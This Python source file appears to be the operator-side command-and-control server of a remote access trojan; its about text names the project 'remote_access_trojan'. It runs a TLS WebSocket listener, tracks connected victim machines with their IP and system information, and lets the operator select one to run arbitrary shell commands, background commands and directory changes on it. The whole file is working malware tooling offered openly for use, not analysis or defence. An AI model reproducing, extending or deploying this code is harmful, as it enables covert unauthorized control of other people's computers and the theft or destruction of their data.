__author__ = "赵博凯"
__license__ = "GPL v3"

import asyncio
import websockets
import ssl
import rich
import json
from sys import exit

from rich.console import Console
from rich.table import Table
from rich.json import JSON
import rich.traceback 

# Install rich traceback with local variables display
rich.traceback.install(show_locals=True)

# --- Basic Configuration ---
# HOST: IP address the server listens on
# PORT: Port number the server listens on
# SSL_CERT: SSL certificate file path
# SSL_KEY: SSL private key file path
HOST = '0.0.0.0' 
PORT = 8765
SSL_CERT = '../cert.pem' 
SSL_KEY = '../key.pem' 

# --- Global Variables ---
# control_list: Stores all connected client information
# select_client: Currently selected client ID
control_list = {}
select_client = None

# --- Custom Logging Output Function ---
class Printer:
    """Custom logging print class supporting different levels of log output"""
    def __init__(self):
        self.console = Console()
    
    def log_info(self, message: str):
        """Output info level log"""
        self.console.log(f"[white on blue][*][/white on blue]", message, style="white")

    def log_warning(self, message: str):
        """Output warning level log"""
        self.console.log(f"[white on yellow][!][/white on yellow]", message, style="yellow")

    def log_error(self, message: str):
        """Output error level log"""
        self.console.log(f"[white on red][-][/white on red]", message, style="bold red")

    def log_success(self, message: str):
        """Output success level log"""
        self.console.log(f"[white on green][+][/white on green]", message, style="green")
    
    def log_debug(self, message: str):
        """Output debug level log"""
        self.console.log(f"[grey50][|][/grey50]", message, style="grey50")

def output(*args, type=""):
    # Log output function, calls different print methods based on type
    printer = Printer()
    if type.strip() == "":
        printer.console.log(*args)
    else:
        if type == "info":
            printer.log_info(*args)
        elif type == "warning":
            printer.log_warning(*args)
        elif type == "error":
            printer.log_error(*args)
        elif type == "success":
            printer.log_success(*args)
        elif type == "debug":
            printer.log_debug(*args)
        else:
            raise ValueError(f"Invalid type: {type}")


# --- Server Logic ---
class Server:
    """Server core functionality class, handles server-level command operations"""
    def __init__(self):
        pass
    
    def help(self):
        """Display help information"""
        help_text = '''Help Information:
[u bold yellow]help[/u bold yellow]:[green] Show help information[/green]
[u bold yellow]about[/u bold yellow]:[green] Show about information[/green]
[u bold yellow]exit[/u bold yellow]:[green] Exit program[/green]
[u bold yellow]clear[/u bold yellow]:[green] Clear terminal screen[/green]
[u bold yellow]list[/u bold yellow]:[green] Show list of connected devices[/green]
[u bold yellow]select <id>[/u bold yellow]:[green] Select a device to control[/green]
[u bold yellow]delete <id>[/u bold yellow]:[green] Delete connected device[/green]'''  
        output(help_text, type="info")

    def about(self):
        """Display about information"""
        about_text = '''About:
Author: 赵博凯
Copyright: Copyright © 赵博凯 2025, All Rights Reserved.
This is open source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
Uses GPL v3 license, please comply with the license.'''
        output(about_text, type="info")
    
    def client_list(self):
        """Display list of connected clients"""
        if len(control_list) == 0:
            output("No devices currently connected.", type="info")
        else:
            output(f"Currently {len(control_list)} devices connected", type="info")
            output("Connected device list:", type="info")
            # Create table using rich library's Table class
            table = Table(
                title="Device Information",
                title_style="bold blue",
                show_header=True,
                border_style="bold purple",
                show_lines=True,
                expand=True
            )
            table.add_column("[bold red]Device ID[/bold red]")
            table.add_column("[bold #FFA500]IP Address[/bold #FFA500]")
            table.add_column("[bold yellow]Connection Status[/bold yellow]")
            table.add_column("[bold green]System Info[/bold green]")
            for device in control_list.items():
                table.add_row(f"{device[0]}", 
                              f"{device[1]['ip']}", 
                              f"{device[1]['status']}",
                              f"{device[1]['systeminfo']}")
            output(table, type="info")
            del table

    def select(self, id):
        """Select client to control"""
        global select_client
        if id in control_list:
            select_client = id
            output(f"Selected device with ID {id}.", type="success")
        else:
            output(f"Device with ID {id} does not exist.", type="error")
    
    async def delete(self, id):
        """Delete specified client connection"""
        global control_list, select_client
        if id in control_list:
            websocket = control_list[id]['websocket']
            try:
                await websocket.send("exit")
            except Exception as e:
                output(f"Exception occurred while disconnecting device with ID {id}: {e}", type="warning")
            control_list.pop(id)
            if select_client == id:
                select_client = None
                output("Deleted device was your currently controlled device, automatically returned to previous level", type="info")
            output(f"Successfully deleted device with ID {id}.", type="success")
        else:
            output(f"Device with ID {id} does not exist.", type="error")

# --- Target Device Control Logic ---
class ControlClient:
    """Client control class, handles operations on selected client"""
    def __init__(self, id):
        self.id = id
        self.websocket = control_list[id]['websocket']

    def help(self):
        """Display client control help information"""
        help_text = '''Help Information:
[u bold yellow]help[/u bold yellow]:[green] Show help information[/green]
[u bold yellow]about[/u bold yellow]:[green] Show about information[/green]
[u bold yellow]back[/u bold yellow]:[green] Return to previous level[/green]
[u bold yellow]clear[/u bold yellow]:[green] Clear terminal screen[/green]
[u bold yellow]list[/u bold yellow]:[green] Show list of connected devices[/green]
[u bold yellow]select <id>[/u bold yellow]:[green] Select a device to control[/green]
[u bold yellow]delete <id>[/u bold yellow]:[green] Delete connected device[/green]
[u bold yellow]command[/u bold yellow]:[green] Enter command mode to execute commands and return results[/green]
[u bold yellow]background <command>[/u bold yellow]:[green] Run command in background without returning results[/green]
[u bold yellow]cd <dir>[/u bold yellow]:[green] Change working directory[/green]'''
        output(help_text, type="info")
    
    async def execute_command(self, command):
        """Execute command and return result"""
        await self.websocket.send(f"command:{command}")
        result = await self.websocket.recv()
        return result

    async def background(self, command):
        """Execute command in background"""
        await self.websocket.send(f"background:{command}")
        await self.websocket.recv()
        output("Command sent", type="success")

    async def change_directory(self, directory):
        """Change working directory"""
        await self.websocket.send(f"cd:{directory}")
        result = await self.websocket.recv()
        return result


# --- Client Connection Handling Logic ---
async def handle_client(websocket):
    """Handle new client connection"""
    ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
    try:
        systeminfo = await websocket.recv()
    except Exception:
        systeminfo = "ERROR"
    # Add new client information to control list
    control_list[str(websocket.id)] = {
        "ip": ip,
        "status": "connected",
        "websocket": websocket,
        "systeminfo": systeminfo
    }
    await websocket.wait_closed()
    
# --- Client Connection Status Check ---
async def check_clients_connection():
    """Periodically check connection status of all clients"""
    global control_list
    while True:
        if len(control_list) > 0:
            for device in control_list.items():
                try:
                    # Send ping to check connection
                    await device[1]['websocket'].ping()
                    control_list[device[0]]['status'] = "connected"
                    if select_client == device[0]:
                        control_list[device[0]]['status'] = "used"
                except:
                    control_list[device[0]]['status'] = "disconnected"
        await asyncio.sleep(10)

# --- User Interaction Logic ---
async def input_loop():
    """Main loop for handling user input"""
    global select_client, control_list

    server = Server()
    while True:
        if select_client is None:
            # Server level command processing
            command = await asyncio.to_thread(input, "(server)> ")
            command = command.strip()
            match command:
                case "": continue
                case "help": server.help()
                case "about": server.about()
                case "exit": output("Program exited normally.", type="success");exit()
                case "clear": print("\033[H\033[J")
                case "list": server.client_list()
                case command if command.startswith("select"): 
                    server.select(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
                case command if command.startswith("delete"): 
                    await server.delete(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
                case _: output(f"Unknown command: {command}, please enter help to view available commands.", type="error")
        else:
            # Client level command processing
            control_client = ControlClient(select_client)
            command = await asyncio.to_thread(input, f"(console)({select_client})> ")
            command = command.strip()
            match command:
                case "": continue
                case "help": control_client.help()
                case "about": server.about()
                case "back": select_client = None
                case "clear": print("\033[H\033[J")
                case "list": server.client_list()
                case command if command.startswith("select"): 
                    server.select(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
                case command if command.startswith("delete"):
                    await server.delete(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
                case "command":
                    # Command execution mode
                    while True:
                        try:
                            command = await asyncio.to_thread(input, f"(command)({select_client})> ")
                            if command == "exit":
                                break
                            else:
                                if command.strip() == "":
                                    continue
                                result = await control_client.execute_command(command)
                                result = json.loads(result)
                                for key, value in result.items():
                                    output(f"[bold cyan]{key}:[/bold cyan] {value}")
                        except Exception as e:
                            output(f"Exception occurred while executing command: {e}", type="error")
                case command if command.startswith("background"):
                    try:
                        await control_client.background(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter command.", type="error")
                    except Exception as e:
                        output(f"Exception occurred while running background command: {e}", type="error")
                case command if command.startswith("cd"):
                    try:
                        result = await control_client.change_directory(command.split(maxsplit=1)[1]);output(result, type="info") if len(command.split(maxsplit=1)) > 1 else output("Please enter directory to change.", type="error")
                    except Exception as e:
                        output(f"Exception occurred while changing directory: {e}", type="error")
                case _: output(f"Unknown command: {command}, please enter help to view available commands.", type="error")

# --- Main Function ---
async def server_loop():
    """Main loop to start the server"""
    output(f"Configuring certificate files, certificate location: {SSL_CERT}, key location: {SSL_KEY}", type="info")
    try:
        # Configure SSL context
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
    except FileNotFoundError:
        output("Certificate file or key file does not exist, please check configuration.", type="error")
        exit()

    output(f"Starting server, listening address: {HOST}, port: {PORT}", type="info")
    # Start WebSocket server
    async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
        await asyncio.Future()

async def main():
    """Program main entry point"""
    output("Starting program...", type="info")
    # Concurrently run server, input loop and connection check
    await asyncio.gather(
        server_loop(),
        input_loop(),
        check_clients_connection()
    )

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        output("Copyright: Copyright © 赵博凯, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        output("Program manually interrupted by user.", type="warning")
        exit()
    except Exception as e:
        output(f"Error: {e}, please report to [link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]", type="error")
